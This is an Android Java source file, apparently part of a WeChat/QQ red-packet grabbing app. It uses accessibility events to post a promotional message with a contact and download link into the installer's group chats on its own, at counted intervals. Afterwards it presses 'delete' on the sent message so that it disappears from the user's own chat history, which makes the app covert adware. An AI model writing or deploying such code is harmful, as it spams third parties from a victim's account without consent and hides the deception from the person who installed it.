/**
 * 
 */
package ad;


import accessibility.QiangHongBaoService;
import android.annotation.TargetApi;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;

import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import accessibility.AccessibilityHelper;
import util.ConfigCt;
import com.example.h3.Config;

/**
 * @author ASUS
 *
 */
public class Ad2 {
	public static final String WX_WINDOW_LAUNCHER_UI="com.tencent.mm.ui.LauncherUI";//微信群聊，单聊窗口；
	public static final String QQ_WINDOW_LAUNCHER_UI="com.tencent.mobileqq.activity.SplashActivity";
	public static final String WX_PACKAGENAME = "com.tencent.mm";//微信的包名
	public static final String QQ_PACKAGENAME = "com.tencent.mobileqq";//QQ的包名
	private static final String EDIT_CLASS_NAME="android.widget.EditText";
	private static final String IMAG_BUTTON_CLASS_NAME="android.widget.ImageButton";
	public static Ad2 current;//实例；
	public static Ad2 currentWX;//微信实例；
	public static Ad2 currentQQ;//QQ实例；
	private Context context;
	private String mCurrentUI="";
	public String mPackageName="";
	//private AccessibilityNodeInfo mRootNode; //窗体根结点
	public int mADmax=500;//广告间隔；
	public int mADcount=1;//广告计数器；
	public static String mStrAD=ConfigCt.ad+"联系"+ConfigCt.contact+"下载地址（复制到浏览器打开）："+ConfigCt.homepage;//广告语；
	public static boolean bReg=ConfigCt.bReg;//
	public boolean bLuckyMoneySend=false;//群里面有红包发布广告吗
	public static String TAG="byc001";
	private static int mWXversion=0;
	private static int mQQversion=0;
	private static final int JOY_IN_OTHER=0;//游戏平台在媒体之外；
	private static final int JOY_IN_WX=1;//游戏平台在微信；
	private static final int JOY_IN_QQ=2;//游戏平台在qq；
	private static int mJoy=JOY_IN_WX;//当前游戏微信；
	private boolean bSend=false;//已发送信息吗？
	private boolean bPast=false;//已粘贴信息吗？
	private boolean bWorking=false;//工作中吗？
	private static QiangHongBaoService service;
	
	private Ad2(QiangHongBaoService service,String PackageName) {
		Ad2.service = service;
		context=(Context)service;
	    this.mPackageName=PackageName;
	    mADmax=getADinterval(service,PackageName);
	    if(PackageName.equals(WX_PACKAGENAME)){
	        mWXversion=getWXversion(service);  
	        VersionParam.init(mWXversion);
	    }
	    if(PackageName.equals(QQ_PACKAGENAME)){
	       mQQversion=getQQversion(service);
	    }
	        //initVersionParam(0);
	}
	public static synchronized Ad2 getAd2(QiangHongBaoService service,String PackageName) {
		if(PackageName.equals(WX_PACKAGENAME)){
	    	if(currentWX == null) {
	    			currentWX= new Ad2(service,WX_PACKAGENAME);
	    	}
	    	return currentWX;
		}
		if(PackageName.equals(QQ_PACKAGENAME)){
			if(currentQQ == null) {currentQQ= new Ad2(service,QQ_PACKAGENAME);}
			return currentQQ;
		}
		if(current == null) {
			current = new Ad2(service,PackageName);
		}
		return current;
	}
	/*
	* 计算广告间隔：
	*/
	public int getADinterval(Context context,String PackageName){
	    	bLuckyMoneySend=ConfigCt.bLuckyMoneySend;
	    	mADmax=ConfigCt.NoRegUserSendADinterval;//广告间隔；
	    	//1.注册否；
	    	bReg=Config.bReg;
	    	//if(bReg)if(Config.getConfig(context).getRegCode().equals(Config.RegCode))bReg=false;
	    	if(bReg){
	    		mADmax=ConfigCt.RegUserSendADinterval;//正版发广告间隔；
	    	}   	   	
	    	if(PackageName.equals(WX_PACKAGENAME)){
	    		if(mJoy==JOY_IN_OTHER||mJoy==JOY_IN_QQ){//当前游戏在QQ，微信之外,广告间隔；
	    			if(bReg)mADmax=ConfigCt.OtherMediaSendADinterval;
	    			bLuckyMoneySend=true;
	    		}
	    	}
	    	if(PackageName.equals(QQ_PACKAGENAME)){
	    		if(mJoy==JOY_IN_OTHER||mJoy==JOY_IN_WX){//当前游戏在QQ，微信之外,广告间隔；
	    			if(bReg)mADmax=ConfigCt.OtherMediaSendADinterval;
	    			bLuckyMoneySend=true;
	    		}
	    	}
	    	return mADmax;
	}
	    /*
	     * 计算广告间隔：
	     */
	public int getADinterval(){
	    	if(this.mPackageName.equals(""))return 500;
	    	String PackageName=this.mPackageName;
	    	bLuckyMoneySend=ConfigCt.bLuckyMoneySend;
	    	mADmax=ConfigCt.NoRegUserSendADinterval;//广告间隔；
	    	//1.注册否；
	    	bReg=Config.bReg;
	    	//if(bReg)if(Config.getConfig(this.context).getRegCode().equals(Config.RegCode))bReg=false;
	    	if(bReg){
	    		mADmax=ConfigCt.RegUserSendADinterval;//正版发广告间隔；
	    	}   	   	
	    	if(PackageName.equals(WX_PACKAGENAME)){
	    		if(mJoy==JOY_IN_OTHER||mJoy==JOY_IN_QQ){//当前游戏在QQ，微信之外,广告间隔；
	    			if(bReg)mADmax=ConfigCt.OtherMediaSendADinterval;
	    			bLuckyMoneySend=true;
	    		}
	    	}
	    	if(PackageName.equals(QQ_PACKAGENAME)){
	    		if(mJoy==JOY_IN_OTHER||mJoy==JOY_IN_WX){//当前游戏在QQ，微信之外,广告间隔；
	    			if(bReg)mADmax=ConfigCt.OtherMediaSendADinterval;
	    			bLuckyMoneySend=true;
	    		}
	    	}
	    	return mADmax;
	}
	    /*
	     *设置广告语：
	     */
	public static void setADsay(String say) {
	    	 mStrAD=say;//广告语；
	}
	    /*
	     * 接收工作任务：
	     */
	public void onReceiveJob(AccessibilityEvent event) {
	    	final int eventType = event.getEventType();
	    	//String sClassName=event.getClassName().toString();
			//mRootNode=event.getSource();
			//if(mRootNode==null)return;
			//mRootNode=AccessibilityHelper.getRootNode(mRootNode);
			//AccessibilityHelper.recycle(mRootNode);
	    	//mADmax=getADinterval(context,event.getPackageName().toString());
			
	    	debug();
			//+++++++++++++++++++++++++++++++++窗口改变+++++++++++++++++++++++++++++++++++++++++++++++
			if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
				if(event.getClassName()==null)return;
				if(event.getPackageName().equals(WX_PACKAGENAME)){
					mCurrentUI=event.getClassName().toString();
				}
				if(event.getPackageName().equals(QQ_PACKAGENAME)){
					mCurrentUI=event.getClassName().toString();
				}
			}
			//+++++++++++++++++++++++++++++++++内容改变+++++++++++++++++++++++++++++++++++++++++++++++
			if (eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
				if(event.getPackageName().equals(WX_PACKAGENAME)){
					WXsendAD(event);
				}
				if(event.getPackageName().equals(QQ_PACKAGENAME)){
					QQsendAD(event);
				}
			}
	}
	    /*
	     * 微信发送广告：
	     */
	public void WXsendAD(AccessibilityEvent event) {
		if(mCurrentUI.equals(WX_WINDOW_LAUNCHER_UI)){
			AccessibilityNodeInfo rootNode=event.getSource();
			if(rootNode==null)return;
			rootNode=AccessibilityHelper.getRootNode(rootNode);
			if(isMemberChatUi(rootNode)==0)return;
			mADcount=mADcount+1;
			Log.i(TAG, "mADcount="+mADcount);
			AccessibilityNodeInfo adNode=null;
			if(!bLuckyMoneySend){//群里面有红包则不发布广告：
				adNode=AccessibilityHelper.findNodeInfosByText(rootNode, "微信红包", -1);
				if(adNode!=null)mADcount=1;
			}
			if(mADcount>mADmax){
				WXADStart();
				mADcount=mADmax-20;
				//WXsendADsay(mRootNode);//试用版发布广告；				
			}
		}
	}
	    /*发布广告信息*/
	public boolean WXpastInfo(AccessibilityNodeInfo rootNode){
		AccessibilityNodeInfo edtNode=AccessibilityHelper.findNodeInfosByClassName(rootNode,EDIT_CLASS_NAME,0,true);
		if(edtNode==null)return false;
		if(nodeInput(edtNode,mStrAD)){
			mADcount=1;
			bPast=true;
			return true;
		}
		return false;
	}
	    /*点击发送按钮*/
	public boolean WXclickSendButton(AccessibilityNodeInfo rootNode){
		AccessibilityNodeInfo sendNode = AccessibilityHelper.findNodeInfosByText(rootNode, "发送", -1);
		if(sendNode==null)return false;
		if(sendNode.performAction(AccessibilityNodeInfo.ACTION_CLICK)){
			bSend=true;
			return true;
		}
		return false;
	}
    /*
     * 微信弹出菜单禁止撤回：
     */
    public void WXpopMenuNoCancel(AccessibilityNodeInfo rootNode) {
		//判断弹出菜单窗体：--------------------------------------------------------
    	AccessibilityNodeInfo copyNode=AccessibilityHelper.findNodeInfosByText(rootNode, "复制",-1);
    	if(copyNode==null)return;
    	AccessibilityNodeInfo favoriteNode=AccessibilityHelper.findNodeInfosByText(rootNode, "收藏",-1);
    	if(favoriteNode==null)return;
    	AccessibilityNodeInfo translateNode=AccessibilityHelper.findNodeInfosByText(rootNode, "翻译",-1);
    	if(translateNode==null)return;
    	AccessibilityNodeInfo moreNode=AccessibilityHelper.findNodeInfosByText(rootNode, "更多",-1);
    	if(moreNode==null)return;
    	//点击收藏
    	AccessibilityHelper.performClick(favoriteNode);
    	//点击更多
    	AccessibilityHelper.performClick(moreNode);
    }
    /*
     * 微信弹出菜单点更多：
     */
    public void WXpopMenuClickMore(AccessibilityNodeInfo rootNode) {
		//判断弹出菜单窗体：--------------------------------------------------------
    	AccessibilityNodeInfo copyNode=AccessibilityHelper.findNodeInfosByText(rootNode, "复制",-1);
    	if(copyNode==null)return;
    	AccessibilityNodeInfo favoriteNode=AccessibilityHelper.findNodeInfosByText(rootNode, "收藏",-1);
    	if(favoriteNode==null)return;
    	AccessibilityNodeInfo translateNode=AccessibilityHelper.findNodeInfosByText(rootNode, "翻译",-1);
    	if(translateNode==null)return;
    	AccessibilityNodeInfo moreNode=AccessibilityHelper.findNodeInfosByText(rootNode, "更多",-1);
    	if(moreNode==null)return;
    	//点击更多
    	AccessibilityHelper.performClick(moreNode);
    }
    /*
     * 微信弹出图片菜单点删除图片按钮：
     */
    public void WXpopClickDelImageButton(AccessibilityNodeInfo rootNode) {
    	if(isMemberChatUi(rootNode)==0)return;
    	AccessibilityNodeInfo nodeInfo=AccessibilityHelper.findNodeInfosByClassName(rootNode, EDIT_CLASS_NAME, -1, true);
    	if(nodeInfo!=null)return;
    	nodeInfo=AccessibilityHelper.findNodeInfosByClassName(rootNode, IMAG_BUTTON_CLASS_NAME, -1, true);
    	if(nodeInfo==null)return;
    	if(AccessibilityHelper.classNames.size()>=4){
    		int size=AccessibilityHelper.classNames.size();
    		nodeInfo=AccessibilityHelper.classNames.get(size-2);
    		AccessibilityHelper.performClick(nodeInfo);
    	}
    }
    /*
     * 微信弹出对话框点删除确定按钮：
     */
    public void WXDialogClickDelOKButton(AccessibilityNodeInfo rootNode) {
    	AccessibilityNodeInfo nodeInfo=AccessibilityHelper.findNodeInfosByText(rootNode, "确认删除？",-1);
    	if(nodeInfo==null)return;
    	nodeInfo=AccessibilityHelper.findNodeInfosByText(rootNode, "取消",-1);
    	if(nodeInfo==null)return;
    	nodeInfo=AccessibilityHelper.findNodeInfosByText(rootNode, "删除",-1);
    	if(nodeInfo==null)return;
    	AccessibilityHelper.performClick(nodeInfo);
    	bWorking=false;
    }
    /** 是否为群聊天*/
    public int isMemberChatUi(AccessibilityNodeInfo rootInfo) {
        if(rootInfo == null)return 0;
        String title = null;
        AccessibilityNodeInfo nodeInfo = AccessibilityHelper.findNodeInfosById(rootInfo, VersionParam.WIDGET_ID_GROUP_TITLE,0);
        if(nodeInfo == null)return 0;
        if(nodeInfo.getText()== null)return 0;
        title = String.valueOf(nodeInfo.getText());
        if(title.endsWith(")"))
            return 2;
        else
        	return 1;
    }
	    /*输入文本*/
	@TargetApi(Build.VERSION_CODES.LOLLIPOP)
	public  boolean nodeInput(AccessibilityNodeInfo edtNode,String txt){
	    	if(android.os.Build.VERSION.SDK_INT>=Build.VERSION_CODES.LOLLIPOP){//android 5.0
	    		Bundle arguments = new Bundle();
	        	arguments.putCharSequence(AccessibilityNodeInfo .ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE,txt);
	        	edtNode.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, arguments);
	        	return true;
	    	}
	    	if(android.os.Build.VERSION.SDK_INT>=Build.VERSION_CODES.JELLY_BEAN_MR2){//android 4.3
	    		ClipboardManager clipboard = (ClipboardManager)context.getSystemService(Context.CLIPBOARD_SERVICE);  
	    		ClipData clip = ClipData.newPlainText("text",txt);  
	    		clipboard.setPrimaryClip(clip);  

	    		edtNode.performAction(AccessibilityNodeInfo.ACTION_FOCUS);  
	    		////粘贴进入内容  
	    		edtNode.performAction(AccessibilityNodeInfo.ACTION_PASTE);  
	    		return true;
	    	}
	    	return false;
	}  
    /*
     * 开始工作
     */
	public void WXADworking(){
    	if(!bWorking)return;
    	AccessibilityNodeInfo rootNode = service.getRootInActiveWindow();
    	if(rootNode==null)return;
		if(!bPast){
			bPast=WXpastInfo(rootNode);
			if(!bPast){bWorking=false;return;}//当粘贴失败时，停止广告；
		}
		if(!bSend)bSend=WXclickSendButton(rootNode);
		//WXpopMenuNoCancel(rootNode);
		WXpopMenuClickMore(rootNode);
		WXpopClickDelImageButton(rootNode);
		WXDialogClickDelOKButton(rootNode);
	}
    /*
     * 开始工作
     */
	public void WXADStart(){
		  bWorking=true;
		  bPast=false;
		  bSend=false;
		  handlerWorking.postDelayed(runnableStop, 1000*60*3); 
		  handlerWorking.postDelayed(runnableWXADworking, 200); 
	}
	private Handler handlerWorking = new Handler();   
	/*
	 *3分钟后停止运行
	*/
	private Runnable runnableStop = new Runnable() {    
		@Override    
		public void run() {    
			bWorking=false;	   
		}    
	};
    /*
     * 200毫秒执行一次
     */
	private Runnable runnableWXADworking = new Runnable() {    
    	@Override    
    	public void run() {    
    		if(!bWorking)return;
    		WXADworking();
    		handlerWorking.postDelayed(this, 200);			   
    	}    
	};
	//++++++++++++++++++++++++++++++++++++++++++QQ+++++++++++++++++++++++++++++++++++++++++++
	 /*
     * QQ发送广告：
     */
    public void QQsendAD(AccessibilityEvent event) {
    	if(mCurrentUI.equals(QQ_WINDOW_LAUNCHER_UI)){
		//-----------------------------------发布广告-----------------------------------------------
			AccessibilityNodeInfo rootNode=event.getSource();
			if(rootNode==null)return;
			rootNode=AccessibilityHelper.getRootNode(rootNode);
			if(isQQMemberChatUi(rootNode)==0)return;
			mADcount=mADcount+1;
			Log.i(TAG, "mADcount="+mADcount);
			if(!bLuckyMoneySend){//群里面有红包则不发布广告：
				AccessibilityNodeInfo nodeInfo=AccessibilityHelper.findNodeInfosByText(rootNode, "QQ红包", -1);
				if(nodeInfo!=null)mADcount=1;
			}
			if(mADcount>mADmax){
				QQADStart();
				mADcount=mADmax-20;
				//WXsendADsay(mRootNode);//试用版发布广告；				
			}
			//if(Config.getConfig(context).bAutoClearThunder)clickLuckyMoney();
		}//if(mCurrentUI.equals(Config.WINDOW_LUCKYMONEY_LAUNCHER_UI)){
    }
    /** 是否为群聊天*/
    public int isQQMemberChatUi(AccessibilityNodeInfo rootNode) {
    	
    	String desc = "群资料卡";
    	AccessibilityNodeInfo nodeInfo=AccessibilityHelper.findNodeInfosByText(rootNode, desc, 0);
    	if(nodeInfo!=null)return 2;
    	desc = "聊天设置";
    	nodeInfo=AccessibilityHelper.findNodeInfosByText(rootNode, desc, 0);
    	if(nodeInfo!=null)return 1;
    	return 0;
    }
    /*
     * 开始工作
     */
	public void QQADworking(){
    	if(!bWorking)return;
    	AccessibilityNodeInfo rootNode = service.getRootInActiveWindow();
    	if(rootNode==null)return;
    	if(isQQMemberChatUi(rootNode)>0){
    		if(!bPast){
    			bPast=QQpastInfo(rootNode);
    			if(!bPast){bWorking=false;return;}//当粘贴失败时，停止广告；
    		}
    		if(!bSend)bSend=QQclickSendButton(rootNode);
    		if(QQLongclickADsay(rootNode))return;
    	}
    	if(QQisPopmenuUi(rootNode))return;
		if(QQDialogDelADsay(rootNode))bWorking=false;
	}
    /*
     * 开始工作
     */
	public void QQADStart(){
		  bWorking=true;
		  bPast=false;
		  bSend=false;
		  handlerWorking.postDelayed(runnableStop, 1000*60*3); 
		  handlerWorking.postDelayed(runnableQQADworking, 200); 
	}
    /*
     * 200毫秒执行一次
     */
	private Runnable runnableQQADworking = new Runnable() {    
    	@Override    
    	public void run() {    
    		if(!bWorking)return;
    		QQADworking();
    		handlerWorking.postDelayed(this, 200);			   
    	}    
	};
	//-------------------------------------------------------------------------------------------
    /*发布广告信息*/
	public boolean QQpastInfo(AccessibilityNodeInfo rootNode){
		AccessibilityNodeInfo edtNode=AccessibilityHelper.findNodeInfosByClassName(rootNode,EDIT_CLASS_NAME,0,true);
		if(edtNode==null)return false;
		if(nodeInput(edtNode,mStrAD)){
			mADcount=1;
			bPast=true;
			return true;
		}
	return false;
	}
    /*点击发送按钮*/
	public boolean QQclickSendButton(AccessibilityNodeInfo rootNode){
		AccessibilityNodeInfo sendNode = AccessibilityHelper.findNodeInfosByText(rootNode, "发送", -1);
		if(sendNode==null)return false;
		if(sendNode.performAction(AccessibilityNodeInfo.ACTION_CLICK)){
			bSend=true;
			return true;
		}
		return false;
	}
    /*长按广告语*/
	public boolean QQLongclickADsay(AccessibilityNodeInfo rootNode){
		AccessibilityNodeInfo nodeInfo=AccessibilityHelper.findNodeInfosByText(rootNode,mStrAD ,-1);
		if(nodeInfo!=null){
			return AccessibilityHelper.performLongClick(nodeInfo);
		}
		return false;
	}
    /** 是否为弹出菜单*/
    public boolean QQisPopmenuUi(AccessibilityNodeInfo rootNode) {
        if(rootNode == null) {
            return false;
        }
        String txt="复制";
        AccessibilityNodeInfo target = AccessibilityHelper.findNodeInfosByText(rootNode, txt, 0);
        if(target == null)return false;
        txt="撤回";
        target = AccessibilityHelper.findNodeInfosByText(rootNode, txt, 0);
        if(target == null)return false;
        txt="删除";
        target = AccessibilityHelper.findNodeInfosByText(rootNode, txt, 0);
        if(target == null)return false;
        AccessibilityHelper.performClick(target);
        
       return true;
    }
    /*
     * QQ删除广告语对话框：
     */
    public boolean QQDialogDelADsay(AccessibilityNodeInfo rootNode) {
		//弹出菜单窗体：-----------------删除 广告语---------------------------------------------------------
		//-------------------------删除信息对话框------------------------------------------------------
		AccessibilityNodeInfo delNode=AccessibilityHelper.findNodeInfosByText(rootNode, "删除后将不会出现在你的消息记录中",-1);
		if(delNode==null)return false;
		delNode=AccessibilityHelper.findNodeInfosByText(rootNode, "删除",-1);
		if(delNode==null)return false;
		return AccessibilityHelper.performClick(delNode);
    }
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	/** 微信包版本*/
    private int getWXversion(Context context) {
        try {
        	PackageInfo WechatPackageInfo =context.getPackageManager().getPackageInfo(WX_PACKAGENAME, 0);
            int v=WechatPackageInfo.versionCode;
            Log.i(TAG, "内部版本号："+v+"；外部版本号："+WechatPackageInfo.versionName);
            return v;
        } catch (PackageManager.NameNotFoundException e) {
            e.printStackTrace();
            
        }
        return 0;
    }
    /** QQ版本*/
    private int getQQversion(Context context) {
        try {
        	PackageInfo QQPackageInfo =context.getPackageManager().getPackageInfo(QQ_PACKAGENAME, 0);
            int v=QQPackageInfo.versionCode;
            Log.i(TAG, "内部版本号："+v+"；外部版本号："+QQPackageInfo.versionName);
            return v;
        } catch (PackageManager.NameNotFoundException e) {
            e.printStackTrace();
            
        }
        return 0;
    }
    private void debug(){
    	if(ConfigCt.DEBUG){
    		//Log.i(Config.TAG2, "mADcount:"+mADcount);
    	}
    }
}
